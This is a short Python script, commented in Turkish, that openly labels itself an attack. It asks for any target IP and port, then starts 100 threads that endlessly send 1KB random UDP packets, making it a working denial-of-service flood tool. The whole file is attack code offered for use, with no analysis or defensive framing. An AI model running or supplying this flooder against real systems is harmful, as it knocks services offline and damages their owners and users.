import socket
import random
import threading

target_ip = input("Hedef IP (Localhost için 127.0.0.1): ")
target_port = int(input("Hedef Port (örn 80): "))

print(f"🚀 SALDIRI BAŞLATILIYOR: {target_ip}:{target_port}")

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024) # 1KB Çöp veri
        try:
            s.sendto(bytes, (target_ip, target_port))
            print(f"Paket gönderildi -> {target_ip}")
        except:
            print("Bağlantı hatası!")
            break

# 100 tane eş zamanlı saldırgan (Thread)
for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()